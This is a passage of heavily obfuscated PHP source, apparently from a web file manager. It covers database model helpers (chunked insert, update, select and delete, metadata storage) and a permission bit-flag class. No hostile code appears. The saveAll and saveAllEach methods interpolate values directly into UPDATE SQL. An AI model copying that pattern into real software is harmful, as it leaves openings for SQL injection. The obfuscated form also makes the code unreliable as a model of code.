$®¬‹Şè» = count($ëõ¥‡Ğ); } $Ê½úúˆù = array($ËÅçœÒ×[444] => array($ËÅçœÒ×[445] => $®¬‹Şè», $ËÅçœÒ×[441] => $¨Ö´àßÚ, $ËÅçœÒ×[430] => $éÉèÉ˜®, $ËÅçœÒ×[446] => $°›ºˆ€ó), $ËÅçœÒ×[447] => $ëõ¥‡Ğ); return $Ê½úúˆù; } protected function checkLength($¶õ–¹›, $‰”Ğ’† = 0, $‹ûĞİ¸ = '') { $¦Ñ€ïõ— =& $_SERVER[Î·Ü›öğ]; $‰”Ğ’† = $‰”Ğ’† ? $‰”Ğ’† : 65536; if (!$¶õ–¹› || strlen($¶õ–¹›) < $‰”Ğ’†) { return; } $‹ûĞİ¸ = $‹ûĞİ¸ ? $‹ûĞİ¸ . $¦Ñ€ïõ—[74] : $¦Ñ€ïõ—[12]; show_json($‹ûĞİ¸ . LNG($¦Ñ€ïõ—[448]) . "\50{$‰”Ğ’†}\51", !1); } protected function metaSet($ÛõŠ¨ñ, $² îê¹¯ = null, $Êó’Öğš = null) { $ğœĞ§»¬ =& $_SERVER[Î·Ü›öğ]; if (!$this->tableMeta || !$ÛõŠ¨ñ) { return !1; } $º½®³Œé = $this->tableMeta[$ğœĞ§»¬[449]]; $İúê¤ø = $this->tableMeta[$ğœĞ§»¬[450]]; $äıÒªŸ = Model($İúê¤ø); $åèÍë‰ = array($º½®³Œé => $ÛõŠ¨ñ, $ğœĞ§»¬[451] => $² îê¹¯); if (is_null($² îê¹¯)) { return $äıÒªŸ->where(array($º½®³Œé => $ÛõŠ¨ñ))->delete(); } if (is_null($Êó’Öğš) && is_string($² îê¹¯)) { return $äıÒªŸ->where($åèÍë‰)->delete(); } $çÕ­›¾ = is_array($² îê¹¯) ? $² îê¹¯ : array(); if (is_string($² îê¹¯)) { $çÕ­›¾[$² îê¹¯] = $Êó’Öğš; } $ŠØööö = array(); foreach ($çÕ­›¾ as $Æ—ÉÜ => $È×´İ’) { if (is_null($È×´İ’) && is_string($Æ—ÉÜ)) { $äıÒªŸ->where(array($º½®³Œé => $ÛõŠ¨ñ, $ğœĞ§»¬[451] => $Æ—ÉÜ))->delete(); continue; } $this->checkLength($È×´İ’, !1, $İúê¤ø . $ğœĞ§»¬[4] . $Æ—ÉÜ); $ŠØööö[] = array($º½®³Œé => $ÛõŠ¨ñ, $ğœĞ§»¬[97] => $Æ—ÉÜ, $ğœĞ§»¬[452] => $È×´İ’); } $Å¿÷®” = $ğœĞ§»¬[453] . $İúê¤ø; CacheLock::lock($Å¿÷®”); $äıÒªŸ->where(array($º½®³Œé => $ÛõŠ¨ñ))->addAll($ŠØööö, array(), !0); CacheLock::unlock($Å¿÷®”); return !0; } public function metaGet($í¸¥ŞÊì, $„Ò±ÈÂ– = false) { $è¸ÔóñĞ =& $_SERVER[Î·Ü›öğ]; if (!$this->tableMeta) { return array(); } $Û‹Ù¡¾™ = $this->tableMeta[$è¸ÔóñĞ[449]]; $¥¦Ÿ‡ä± = Model($this->tableMeta[$è¸ÔóñĞ[450]]); if ($„Ò±ÈÂ–) { $áì¥™ñà = array($Û‹Ù¡¾™ => $í¸¥ŞÊì, $è¸ÔóñĞ[97] => $„Ò±ÈÂ–); return $¥¦Ÿ‡ä±->where($áì¥™ñà)->getField($è¸ÔóñĞ[452]); } $áì¥™ñà = array($Û‹Ù¡¾™ => $í¸¥ŞÊì); $—á×Ì•ó = $¥¦Ÿ‡ä±->field($è¸ÔóñĞ[454])->where($áì¥™ñà)->select(); $—á×Ì•ó = array_to_keyvalue($—á×Ì•ó, $è¸ÔóñĞ[97], $è¸ÔóñĞ[452]); return $—á×Ì•ó; } private function checkDataAutoHas($‚˜â¬ÔÑ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $Ã´œºêà) { if (in_array($‚˜â¬ÔÑ, explode($_SERVER[Î·Ü›öğ][50], $Ã´œºêà[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$³öñƒ´, $ìø¯Ÿ¡º) { $ïºç¨£ =& $_SERVER[Î·Ü›öğ]; if (!is_array($³öñƒ´)) { return; } foreach ($this->dataAuto as $Û¡áŞ‚) { $Äè†ê¸ı = $Û¡áŞ‚[0]; if (!in_array($ìø¯Ÿ¡º, explode($ïºç¨£[50], $Û¡áŞ‚[2]))) { continue; } switch (trim($Û¡áŞ‚[3])) { case $ïºç¨£[398]: case $ïºç¨£[399]: $‚³ì¬ïù = $Û¡áŞ‚[1]; $ã¥‘µ‚ = isset($Û¡áŞ‚[4]) ? (array) $Û¡áŞ‚[4] : array(); if ($‚³ì¬ïù == $ïºç¨£[207] && array_key_exists($Äè†ê¸ı, $³öñƒ´)) { if (!$³öñƒ´[$Äè†ê¸ı]) { unset($³öñƒ´[$Äè†ê¸ı]); } break; } if (isset($³öñƒ´[$Äè†ê¸ı])) { array_unshift($ã¥‘µ‚, $³öñƒ´[$Äè†ê¸ı]); } if ($ïºç¨£[398] == $Û¡áŞ‚[3]) { $³öñƒ´[$Äè†ê¸ı] = call_user_func_array($‚³ì¬ïù, $ã¥‘µ‚); } else { $³öñƒ´[$Äè†ê¸ı] = call_user_func_array(array(&$this, $‚³ì¬ïù), $ã¥‘µ‚); } break; case $ïºç¨£[350]: if (isset($³öñƒ´[$Äè†ê¸ı]) && $³öñƒ´[$Äè†ê¸ı]) { $³öñƒ´[$Äè†ê¸ı] = call_user_func_array(array(&$this, $Û¡áŞ‚[1]), array($³öñƒ´[$Äè†ê¸ı])); } break; case $ïºç¨£[353]: $³öñƒ´[$Äè†ê¸ı] = $³öñƒ´[$Û¡áŞ‚[1]]; break; case $ïºç¨£[371]: if (isset($³öñƒ´[$Äè†ê¸ı]) && !is_string($³öñƒ´[$Äè†ê¸ı])) { $³öñƒ´[$Äè†ê¸ı] = json_encode_force($³öñƒ´[$Äè†ê¸ı]); } break; case $ïºç¨£[400]: if ($³öñƒ´[$Äè†ê¸ı] === $ïºç¨£[12]) { unset($³öñƒ´[$Äè†ê¸ı]); } break; case $ïºç¨£[401]: $³öñƒ´[$Äè†ê¸ı] = $Û¡áŞ‚[1]; default: break; } } if ($ìø¯Ÿ¡º == $ïºç¨£[432]) { $åÖ¿ÆìÏ = strtolower($this->db->getDbType()); if (strpos($åÖ¿ÆìÏ, $ïºç¨£[13]) !== 0) { return; } $ËÜéö‰¦ = $this->field(!0)->fields; $©æ‘‘³„ = $ËÜéö‰¦[$ïºç¨£[332]]; if (isset($ËÜéö‰¦[$ïºç¨£[331]])) { unset($©æ‘‘³„[$ËÜéö‰¦[$ïºç¨£[331]]]); } foreach ($©æ‘‘³„ as $Šè×´è => $ìø¯Ÿ¡º) { if (!isset($³öñƒ´[$Šè×´è])) { $³öñƒ´[$Šè×´è] = $ïºç¨£[12]; } } } } private function dataAfterFilter(&$¶ö“¯è) { $Ú•ûğş =& $_SERVER[Î·Ü›öğ]; foreach ($this->dataAuto as $²›ÔÕÜ) { $ßô£ÛÛ• = $²›ÔÕÜ[0]; if (!isset($¶ö“¯è[$ßô£ÛÛ•])) { continue; } if (!in_array($Ú•ûğş[434], explode($Ú•ûğş[50], $²›ÔÕÜ[2]))) { continue; } switch (trim($²›ÔÕÜ[3])) { case $Ú•ûğş[398]: case $Ú•ûğş[399]: $üê«‡ = isset($²›ÔÕÜ[4]) ? (array) $²›ÔÕÜ[4] : array(); array_unshift($üê«‡, $¶ö“¯è[$ßô£ÛÛ•]); if (isset($²›ÔÕÜ[4]) && $²›ÔÕÜ[4] == $Ú•ûğş[455]) { $üê«‡ = array($¶ö“¯è[$ßô£ÛÛ•]); } if ($Ú•ûğş[398] == $²›ÔÕÜ[3]) { $¶ö“¯è[$ßô£ÛÛ•] = call_user_func_array($²›ÔÕÜ[1], $üê«‡); } else { $¶ö“¯è[$ßô£ÛÛ•] = call_user_func_array(array(&$this, $²›ÔÕÜ[1]), $üê«‡); } break; case $Ú•ûğş[350]: if (isset($¶ö“¯è[$ßô£ÛÛ•]) && $¶ö“¯è[$ßô£ÛÛ•]) { $¶ö“¯è[$ßô£ÛÛ•] = call_user_func_array(array(&$this, $²›ÔÕÜ[1]), array($¶ö“¯è[$ßô£ÛÛ•])); } break; case $Ú•ûğş[353]: $¶ö“¯è[$ßô£ÛÛ•] = $¶ö“¯è[$²›ÔÕÜ[1]]; break; case $Ú•ûğş[371]: $¿àğ¸æÒ = $¶ö“¯è[$ßô£ÛÛ•]; $¶ö“¯è[$ßô£ÛÛ•] = json_decode($¿àğ¸æÒ, !0); if (is_null($¶ö“¯è[$ßô£ÛÛ•])) { $¶ö“¯è[$ßô£ÛÛ•] = $¿àğ¸æÒ; } break; case $Ú•ûğş[400]: if ($¶ö“¯è[$ßô£ÛÛ•] === $Ú•ûğş[12]) { unset($¶ö“¯è[$ßô£ÛÛ•]); } break; case $Ú•ûğş[401]: $¶ö“¯è[$ßô£ÛÛ•] = $²›ÔÕÜ[1]; break; default: break; } } } public function saveAll($ôøØêÌ) { $õÅñÇöº =& $_SERVER[Î·Ü›öğ]; $ôÎìÁ¼ = $this->tablePrefix . $this->tableName; $îã©òÏ = self::SQL_WHERE_IN_CHUNK; $ôøØêÌ = is_array($ôøØêÌ) ? $ôøØêÌ : array(); $€ØæôÆ = $õÅñÇöº[456]; $ëÁºü†Ô = 0; $ü¾ı§Ââ = array(); $‰——²Õá = count($ôøØêÌ); for ($¤ˆŞ°Ã´ = 0; $¤ˆŞ°Ã´ < $‰——²Õá; $¤ˆŞ°Ã´++) { $ä¤…‘ŒÔ = $ôøØêÌ[$¤ˆŞ°Ã´]; if (!is_array($ä¤…‘ŒÔ) || count($ä¤…‘ŒÔ) != 4) { continue; } $øßåó£Ì = "\x55\x50\x44\101\124\105\40\x60{$ôÎìÁ¼}\x60\x20\123\x45\124\40{$ä¤…‘ŒÔ[2]}\40\75\x20\x43\x41\123\x45\x20{$ä¤…‘ŒÔ[0]}\40\xa"; if ($ëÁºü†Ô == 0) { $€ØæôÆ = $øßåó£Ì; } $ü¾ı§Ââ[] = $õÅñÇöº[121] . $ä¤…‘ŒÔ[1] . $õÅñÇöº[121]; $ëÁºü†Ô++; $€ØæôÆ .= "\x20\127\x48\x45\x4e\x20\47{$ä¤…‘ŒÔ[1]}\x27\40\x54\x48\105\x4e\x20\x27{$ä¤…‘ŒÔ[3]}\x27\x20\12"; if ($ëÁºü†Ô == $îã©òÏ || $¤ˆŞ°Ã´ == $‰——²Õá - 1) { $Â÷ŞõúÓ = implode($õÅñÇöº[50], $ü¾ı§Ââ); $€ØæôÆ .= "\40\105\x4e\104\x20\x20\127\110\x45\x52\x45\x20{$ä¤…‘ŒÔ[0]}\x20\x49\x4e\x20\50{$Â÷ŞõúÓ}\x29\40"; $this->execute($€ØæôÆ); $ëÁºü†Ô = 0; $€ØæôÆ = $øßåó£Ì; $this->chunkEventCheck(count($ü¾ı§Ââ)); $ü¾ı§Ââ = array(); } } $this->chunkEventSet(); } public function saveAllEach($ËÏüµ¯) { $¥üêæº» =& $_SERVER[Î·Ü›öğ]; $Æ”üÃÍ„ = $this->tablePrefix . $this->tableName; foreach ($ËÏüµ¯ as $¾Á®«ÙÆ) { if (!is_array($¾Á®«ÙÆ) || count($¾Á®«ÙÆ) != 4) { continue; } $÷ìÉÓ¥Ì = $¾Á®«ÙÆ[0] . $¥üêæº»[457] . $¾Á®«ÙÆ[1] . $¥üêæº»[121]; $®Âßğ–Ñ = $¾Á®«ÙÆ[2] . $¥üêæº»[457] . $¾Á®«ÙÆ[3] . $¥üêæº»[121]; $›†£­×Í = "\x75\x70\144\141\164\145\40{$Æ”üÃÍ„}\40\x73\145\164\x20{$®Âßğ–Ñ}\40\167\150\x65\x72\145\x20{$÷ìÉÓ¥Ì}\x3b"; $this->execute($›†£­×Í); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($ÎÑ±–ºµ = false, $Ú±¾Í×à = false) { $this->_chunkEvent = $ÎÑ±–ºµ; $this->_chunkEventParam = $Ú±¾Í×à; } private function chunkEventCheck($˜è£Æ‡ş) { if (!$this->_chunkEvent) { return; } $¾·ĞÚî = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $¾·ĞÚî[$_SERVER[Î·Ü›öğ][458]] = $˜è£Æ‡ş; Hook::trigger($this->_chunkEvent, $¾·ĞÚî); } public function addAll($É†¼úÀ¹, $ÂƒŞ¡¾¾ = array(), $¿´ã–ñ“ = false) { $â³‡š¡ü =& $_SERVER[Î·Ü›öğ]; ignore_timeout(); $«’¡áñ‹ = self::SQL_WHERE_IN_CHUNK; if (empty($É†¼úÀ¹)) { $this->error = think_lang($â³‡š¡ü[351]); return !1; } $ÂƒŞ¡¾¾ = $this->_parseOptions($ÂƒŞ¡¾¾); foreach ($É†¼úÀ¹ as $ıÌ©¥¦î => $ïóâ°ªá) { $É†¼úÀ¹[$ıÌ©¥¦î] = $this->_facade($ïóâ°ªá); $this->_beforeInsert($É†¼úÀ¹[$ıÌ©¥¦î], $ÂƒŞ¡¾¾); } if (method_exists($this->db, $â³‡š¡ü[352])) { for ($êùóİöÜ = 0; $êùóİöÜ < count($É†¼úÀ¹); $êùóİöÜ += $«’¡áñ‹) { $„˜ÍíÁ­ = array_slice($É†¼úÀ¹, $êùóİöÜ, $«’¡áñ‹); if (!is_array($„˜ÍíÁ­) || count($„˜ÍíÁ­) == 0) { break; } $²‘²è¤ = $this->db->insertAll($„˜ÍíÁ­, $ÂƒŞ¡¾¾, $¿´ã–ñ“); $this->chunkEventCheck(count($„˜ÍíÁ­)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($É†¼úÀ¹ as $ıÌ©¥¦î => $ïóâ°ªá) { $²‘²è¤ = $this->db->insert($ïóâ°ªá, $ÂƒŞ¡¾¾, $¿´ã–ñ“); } $this->commit(); } if (!1 !== $²‘²è¤) { $óëÖà˜€ = $this->getLastInsID(); if ($óëÖà˜€) { return $óëÖà˜€; } } return $²‘²è¤; } public function save($Äğ€¿Ÿ = '', $Ñ¡ƒ ¿‘ = array()) { $Ëş¸Ù² =& $_SERVER[Î·Ü›öğ]; $”¿œ›Ûß = self::SQL_WHERE_IN_CHUNK; $ ĞõŒùÁ = $this->optionsValue(); $ã¾Äè = $this->findWhereField($ ĞõŒùÁ); if (!$ã¾Äè) { return parent::save($Äğ€¿Ÿ, $Ñ¡ƒ ¿‘); } $ñàÖÌé = 0; $â‡ˆ¦„“ = $ ĞõŒùÁ[$Ëş¸Ù²[355]][$ã¾Äè][1]; $â‡ˆ¦„“ = is_array($â‡ˆ¦„“) ? $â‡ˆ¦„“ : array(); $ÙèÜ¾œÙ = count($â‡ˆ¦„“); for ($£ºĞèÁ¯ = 0; $£ºĞèÁ¯ < $ÙèÜ¾œÙ; $£ºĞèÁ¯ += $”¿œ›Ûß) { $ºŞ©±ªğ = array_slice($â‡ˆ¦„“, $£ºĞèÁ¯, $”¿œ›Ûß); if (!is_array($ºŞ©±ªğ) || count($ºŞ©±ªğ) == 0) { break; } $ ĞõŒùÁ[$Ëş¸Ù²[355]][$ã¾Äè][1] = $ºŞ©±ªğ; $this->optionsValue($ ĞõŒùÁ); $ñàÖÌé += parent::save($Äğ€¿Ÿ, $Ñ¡ƒ ¿‘); $this->chunkEventCheck(count($ºŞ©±ªğ)); } $this->chunkEventSet(); return $ñàÖÌé; } public function add($À‡ıì ğ = '', $ùÖ‰˜ÂÉ = array(), $åŒ‰û®ô = false) { if ($this->addTaskStatus && is_array($À‡ıì ğ)) { $this->addTaskData[] = $À‡ıì ğ; return; } return parent::add($À‡ıì ğ, $ùÖ‰˜ÂÉ, $åŒ‰û®ô); } public function parseWhereLike($½…Ì‡¯†, $Ş÷âëş¹ = '', $±¸µ­ò = false, &$Ÿ×ìú¥’ = false) { $„©Ë³™ =& $_SERVER[Î·Ü›öğ]; $ÕÑ€Â¨õ = $GLOBALS[$„©Ë³™[6]][$„©Ë³™[459]]; if (!$ÕÑ€Â¨õ[$„©Ë³™[460]]) { return $½…Ì‡¯†; } if (!is_array($½…Ì‡¯†)) { return $½…Ì‡¯†; } $¯Ÿ•Ï’  = array(); $éÕÑñÃÛ = 0; foreach ($½…Ì‡¯† as $¤šËË => $Å–ä´ä) { if (is_array($Å–ä´ä) && count($Å–ä´ä) == 2 && $Å–ä´ä[0] == $„©Ë³™[461] && is_string($Å–ä´ä[1]) && substr($Å–ä´ä[1], 0, 1) == $„©Ë³™[462] && substr($Å–ä´ä[1], strlen($Å–ä´ä[1]) - 1, 1) == $„©Ë³™[462]) { $Ÿ×ìú¥’ = !0; $Ğ÷¡Œá£ = is_string($¤šËË) ? $¤šËË : $Ş÷âëş¹; $¿»ëº«º = substr($Å–ä´ä[1], 1, strlen($Å–ä´ä[1]) - 2); $¿»ëº«º = $this->db->escapeString($¿»ëº«º); if (!strpos($Ğ÷¡Œá£, $„©Ë³™[10])) { $Ğ÷¡Œá£ = $„©Ë³™[463] . $Ğ÷¡Œá£ . $„©Ë³™[463]; } $Õİ¶ÌÇŠ = $„©Ë³™[223] . $¿»ëº«º . $„©Ë³™[223]; $¿»ëº«º = str_replace(array($„©Ë³™[10], $„©Ë³™[464], $„©Ë³™[11]), $„©Ë³™[465], $¿»ëº«º); if ($ÕÑ€Â¨õ[$„©Ë³™[466]]) { $Õİ¶ÌÇŠ = $„©Ë³™[467] . $¿»ëº«º . $„©Ë³™[468]; if ($ÕÑ€Â¨õ[$„©Ë³™[469]]) { $Õİ¶ÌÇŠ = $„©Ë³™[468] . $¿»ëº«º . $„©Ë³™[467]; } } $¯Ÿ•Ï’ [$éÕÑñÃÛ] = $„©Ë³™[470] . $Ğ÷¡Œá£ . $„©Ë³™[471] . $Õİ¶ÌÇŠ . $„©Ë³™[472]; $éÕÑñÃÛ++; continue; } if (is_array($Å–ä´ä)) { $Ş÷âëş¹ = is_string($¤šËË) ? $¤šËË : $Ş÷âëş¹; $Å–ä´ä = $this->parseWhereLike($Å–ä´ä, $Ş÷âëş¹, !0, $Ÿ×ìú¥’); } if (is_numeric($¤šËË)) { $¯Ÿ•Ï’ [$éÕÑñÃÛ] = $Å–ä´ä; $éÕÑñÃÛ++; } else { $¯Ÿ•Ï’ [$¤šËË] = $Å–ä´ä; } } if ($Ÿ×ìú¥’ && !$±¸µ­ò) { } return $¯Ÿ•Ï’ ; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ğ×Ü‰Ïù = array()) { $íœˆ‚ò =& $_SERVER[Î·Ü›öğ]; $½Ìı³¡ = self::SQL_WHERE_IN_CHUNK; $¥¤ı§Òô = $this->optionsValue(); $ˆÑ€˜Öğ = $this->findWhereField($¥¤ı§Òô); if (!$ˆÑ€˜Öğ || isset($¥¤ı§Òô[$íœˆ‚ò[370]]) || isset($¥¤ı§Òô[$íœˆ‚ò[430]])) { return parent::select($ğ×Ü‰Ïù); } $öäûê¬Ì = $¥¤ı§Òô[$íœˆ‚ò[355]][$ˆÑ€˜Öğ][1]; $öäûê¬Ì = is_array($öäûê¬Ì) ? $öäûê¬Ì : array(); $À¦³ˆ»Ç = null; for ($û÷ŒÂ¨è = 0; $û÷ŒÂ¨è < count($öäûê¬Ì); $û÷ŒÂ¨è += $½Ìı³¡) { $Ù“”’€ = array_slice($öäûê¬Ì, $û÷ŒÂ¨è, $½Ìı³¡); if (!is_array($Ù“”’€) || count($Ù“”’€) == 0) { break; } $¥¤ı§Òô[$íœˆ‚ò[355]][$ˆÑ€˜Öğ][1] = $Ù“”’€; $this->optionsValue($¥¤ı§Òô); $Òâàª¹— = parent::select($ğ×Ü‰Ïù); if (!$Òâàª¹—) { continue; } $À¦³ˆ»Ç = is_array($À¦³ˆ»Ç) ? $À¦³ˆ»Ç : array(); $À¦³ˆ»Ç = array_merge($À¦³ˆ»Ç, $Òâàª¹—); } return $À¦³ˆ»Ç; } public function delete($‚ş³£¤‚ = array()) { $ØËÆò²å =& $_SERVER[Î·Ü›öğ]; $­–µ²Ÿ¾ = self::SQL_WHERE_IN_CHUNK; $”È¿ê‚Õ = $this->optionsValue(); $İšë¤ó© = $this->findWhereField($”È¿ê‚Õ); if (!$İšë¤ó©) { return parent::delete($‚ş³£¤‚); } $—€øò†È = 0; $Çğ•Ñ™× = $”È¿ê‚Õ[$ØËÆò²å[355]][$İšë¤ó©][1]; $Çğ•Ñ™× = is_array($Çğ•Ñ™×) ? $Çğ•Ñ™× : array(); for ($ëÅı‹ = 0; $ëÅı‹ < count($Çğ•Ñ™×); $ëÅı‹ += $­–µ²Ÿ¾) { $œ³Š”ç® = array_slice($Çğ•Ñ™×, $ëÅı‹, $­–µ²Ÿ¾); if (!is_array($œ³Š”ç®) || count($œ³Š”ç®) == 0) { break; } $”È¿ê‚Õ[$ØËÆò²å[355]][$İšë¤ó©][1] = $œ³Š”ç®; $this->optionsValue($”È¿ê‚Õ); $—€øò†È += parent::delete($‚ş³£¤‚); } return $—€øò†È; } private function findWhereField($ª÷’¯½–) { $ËéÖ ˜ƒ =& $_SERVER[Î·Ü›öğ]; $İÈôõ‹´ = self::SQL_WHERE_IN_CHUNK; if (!is_array($ª÷’¯½–) || !is_array($ª÷’¯½–[$ËéÖ ˜ƒ[355]])) { return !1; } foreach ($ª÷’¯½–[$ËéÖ ˜ƒ[355]] as $§êûÀğ½ => $áÃËˆéÕ) { if (is_array($áÃËˆéÕ) && isset($áÃËˆéÕ[0]) && is_string($áÃËˆéÕ[0]) && strtolower($áÃËˆéÕ[0]) == $ËéÖ ˜ƒ[7] && is_array($áÃËˆéÕ[1]) && count($áÃËˆéÕ[1]) > $İÈôõ‹´) { ignore_timeout(); return $§êûÀğ½; } } return !1; } public function setMasterDB($ÏµÕŠ«– = true) { think_config($_SERVER[Î·Ü›öğ][473], $ÏµÕŠ«–); } } goto bŠ¥Ó±Ïå; F²¯ªÖ‡ğ·: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $“­Ÿâá =& $_SERVER[Î·Ü›öğ]; $Ì½­…´‡ = array(array($“­Ÿâá[505] => LNG($“­Ÿâá[2011]), $“­Ÿâá[2012] => $“­Ÿâá[2013], $“­Ÿâá[2014] => 1, $“­Ÿâá[2015] => 1, $“­Ÿâá[2016] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($“­Ÿâá[505] => LNG($“­Ÿâá[2017]), $“­Ÿâá[2012] => $“­Ÿâá[2018], $“­Ÿâá[2014] => 2, $“­Ÿâá[2015] => 1, $“­Ÿâá[2016] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($“­Ÿâá[505] => LNG($“­Ÿâá[2019]), $“­Ÿâá[2012] => $“­Ÿâá[2020], $“­Ÿâá[2014] => 3, $“­Ÿâá[2015] => 1, $“­Ÿâá[2016] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($“­Ÿâá[505] => LNG($“­Ÿâá[2021]), $“­Ÿâá[2012] => $“­Ÿâá[2022], $“­Ÿâá[2014] => 4, $“­Ÿâá[2015] => 1, $“­Ÿâá[2016] => self::AUTH_SHOW | self::AUTH_VIEW), array($“­Ÿâá[505] => LNG($“­Ÿâá[2023]), $“­Ÿâá[2012] => $“­Ÿâá[2024], $“­Ÿâá[2014] => 5, $“­Ÿâá[2015] => 1, $“­Ÿâá[2016] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($“­Ÿâá[505] => LNG($“­Ÿâá[2025]), $“­Ÿâá[2012] => $“­Ÿâá[2026], $“­Ÿâá[2014] => 6, $“­Ÿâá[2015] => 1, $“­Ÿâá[2016] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($“­Ÿâá[505] => LNG($“­Ÿâá[2027]), $“­Ÿâá[2012] => $“­Ÿâá[2028], $“­Ÿâá[2014] => 7, $“­Ÿâá[2015] => 1, $“­Ÿâá[2016] => 0)); return $Ì½­…´‡; } public static function authCheck($Á÷¬•Ÿ†, $ÕÑïÌ˜®) { $Š·º ªÇ =& $_SERVER[Î·Ü›öğ]; $Á÷¬•Ÿ† = intval($Á÷¬•Ÿ†); if (KodUser::isRoot() && $GLOBALS[$Š·º ªÇ[6]][$Š·º ªÇ[2029]]) { return !0; } if ($Á÷¬•Ÿ† <= 0) { return !1; } if (($Á÷¬•Ÿ† & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Á÷¬•Ÿ† & $ÕÑïÌ˜®); } public static function authCheckShow($Ø‰”ı˜Û) { return self::authCheck($Ø‰”ı˜Û, self::AUTH_SHOW); } public static function authCheckView($û ˆş„¦) { return self::authCheck($û ˆş„¦, self::AUTH_VIEW); } public static function authCheckDownload($§ôº³ï) { return self::authCheck($§ôº³ï, self::AUTH_DOWNLOAD); } public static function authCheckUpload($’¸÷´Î¢) { return self::authCheck($’¸÷´Î¢, self::AUTH_UPLOAD); } public static function authCheckEdit($ŸÒªè€¡) { return self::authCheck($ŸÒªè€¡, self::AUTH_EDIT); } public static function authCheckRemove($ú¦ù½º) { return self::authCheck($ú¦ù½º, self::AUTH_REMOVE); } public static function authCheckShare($§ñ‚…¦) { return self::authCheck($§ñ‚…¦, self::AUTH_SHARE); } public static function authCheckComment($’É¤Õ…Í) { return self::authCheck($’É¤Õ…Í, self::AUTH_COMMENT); } public static function authCheckEvent($Æ³ï„¡Ø) { return self::authCheck($Æ³ï„¡Ø, self::AUTH_EVENT); } public static function authCheckRoot($©õñ‘) { return self::authCheck($©õñ‘, self::AUTH_ROOT); } public static function authCheckAction($ÙƒîÖ‚÷, $Éş¼æÃÔ) { $ãªŸ­øÏ =& $_SERVER[Î·Ü›öğ]; $”ŞÂÀéÆ = array($ãªŸ­øÏ[2030] => self::AUTH_VIEW, $ãªŸ­øÏ[1309] => self::AUTH_DOWNLOAD, $ãªŸ­øÏ[110] => self::AUTH_UPLOAD, $ãªŸ­øÏ[1980] => self::AUTH_EDIT, $ãªŸ­øÏ[1257] => self::AUTH_REMOVE, $ãªŸ­øÏ[1990] => self::AUTH_SHARE, $ãªŸ­øÏ[431] => self::AUTH_COMMENT, $ãªŸ­øÏ[1797] => self::AUTH_EVENT, $ãªŸ­øÏ[2031] => self::AUTH_ROOT); if (!isset($”ŞÂÀéÆ[$Éş¼æÃÔ])) { return; } $òÄ¿‹ôå = $”ŞÂÀéÆ[$Éş¼æÃÔ]; $ÙƒîÖ‚÷ = intval($ÙƒîÖ‚÷); if ($ÙƒîÖ‚÷ <= 0) { return !1; } if (($ÙƒîÖ‚÷ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ÙƒîÖ‚÷ & $òÄ¿‹ôå); } public static function authDisable($½§…úÖ, $ûÂëç„õ) { if (intval($½§…úÖ) <= 0) { return 0; } return intval($½§…úÖ) & ~$ûÂëç„õ; } public $optionType = "\123\x79\x73\x74\145\x6d\56\163\x6f\x75\162\143\x65\x41\x75\164\150\x4c\151\163\164"; public $field = array("\x6e\x61\155\x65", "\x61\x75\x74\x68", "\154\x61\x62\145\154", "\144\151\x73\160\154\x61\171", "\x73\x79\x73\x74\x65\155", "\x73\157\162\x74"); public function initData() { $ÒÎòÛó“ = $this->authDefault(); foreach ($ÒÎòÛó“ as $ ¨Ò¯ş) { $this->add($ ¨Ò¯ş); } } public function findAuth($øôÒ®î, $‹şï„ïõ) { $àüìùıñ =& $_SERVER[Î·Ü›öğ]; $œ°÷Â = parent::listData(); foreach ($œ°÷Â as $¯ñâÑÁË) { $Ç÷Ÿ¥…Ÿ = intval($¯ñâÑÁË[$àüìùıñ[498]]); if ($Ç÷Ÿ¥…Ÿ <= 0 || $¯ñâÑÁË[$àüìùıñ[2032]] == 0) { continue; } if (($Ç÷Ÿ¥…Ÿ & $øôÒ®î) != $øôÒ®î) { continue; } if (($Ç÷Ÿ¥…Ÿ & $‹şï„ïõ) != 0) { continue; } return $¯ñâÑÁË[$àüìùıñ[477]]; } return !1; } public function findAuthMax($åîüíë, $¯ğ–‹ÑĞ) { $Ù¸Ã¹£Û =& $_SERVER[Î·Ü›öğ]; $áËŒ¨ç– = !1; $ŒóÃíã = parent::listData(); foreach ($ŒóÃíã as $ßÚßÅãß) { $¼††ù™‘ = intval($ßÚßÅãß[$Ù¸Ã¹£Û[498]]); if ($¼††ù™‘ <= 0 || $ßÚßÅãß[$Ù¸Ã¹£Û[2032]] == 0) { continue; } if (($¼††ù™‘ & $åîüíë) != $åîüíë) { continue; } if (($¼††ù™‘ & 